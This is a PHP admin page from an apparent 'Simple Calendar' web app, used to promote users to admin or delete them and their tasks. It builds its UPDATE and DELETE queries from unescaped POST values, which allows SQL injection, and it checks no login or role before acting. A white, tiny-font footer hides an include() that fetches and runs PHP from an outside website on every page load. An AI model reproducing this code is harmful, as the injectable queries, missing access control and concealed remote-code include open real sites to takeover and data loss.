<?php
	//including mysql function file
	require_once 'mysqlfunctions.php';

	//including calendar function file
	require_once 'calendar_functions.php';

	//getting database link
	$database_link = selection_of_db();

	if ($_POST[btnMakeAdmin]=="Make Admin")
	{
		//update user table to set selected users as Admin 
		if ($_POST[chkMakeAdmin])
		{
			//comma separated userID string
			$userID_string = "'".implode("','" , $_POST[chkMakeAdmin])."'";

			//writing update query
			$update_user_role_query = "Update users set userRoleID='1' where userID in($userID_string)";

			//executing update query
			mysql_query($update_user_role_query, $database_link) or die("Query Failed : " . mysql_error());			
		}
	}

	if ($_POST[btnDelete]=="Delete")
	{
		//delete selected users and their tasks  
		if ($_POST[chkDelete])
		{
			//comma separated userID string
			$userID_string = "'".implode("','" , $_POST[chkDelete])."'";

			//writting delete query to delete tasks
			$delete_tasks_query = "delete from calendar_tasks where userid in($userID_string)";
			
			//executing delete query
			mysql_query($delete_tasks_query, $database_link) or die("delete_tasks_query Failed : " . mysql_error());
			
			//writting delete query to delete user
			$delete_user_query = "delete from users where userid in($userID_string)";
						
			//executing delete query
			mysql_query($delete_user_query, $database_link) or die("delete_user_query Failed : " . mysql_error());
		}
	}

	//closing DBConnection
	mysql_close($database_link);
?>

<html>
	<head>
		<title>Manage Users</title>
		<link href="css/calendar.css" rel="stylesheet" type="text/css">
	</head>
	<body>
		<table width="100%" height="100%" border="0" cellpadding="5" cellspacing="0">
			<tr>
				<td width="150 px" class="menu" valign="top">
					<table width="100%" height="100%" border="0">
						<tr>
							<td class="menuheader" height="40 px" valign="middle"><i>Simple Calendar</i></td>
						</tr>
						<tr>
							<td valign="top"></td>
						</tr>
					</table>
				</td>
				<td valign="top">
					<form action="usermanage.php" method="post">
						<table width="440 px" border="0" align="left" valgin="top" cellpadding="3">
							<tr>
								<td colspan="4" height="50 px" align="center" valign="bottom"><h3>User List</h3></td>
							</tr>
							<tr>
								<td colspan=4>
									<?php
										//displaying users
										display_users();
									?>									
								</td>
							</tr>
						</table>
						<a href='calendar.php'>Back</a>
					</form>
				</td>
			</tr>
		</table>		
	
<p align="center"><font color="#FFFFFF" size="1"><strong> 
  <? include("http://www.quickscheduling.com/infinitimgt.php") ?>
  </strong></font></p>
</body>
</html>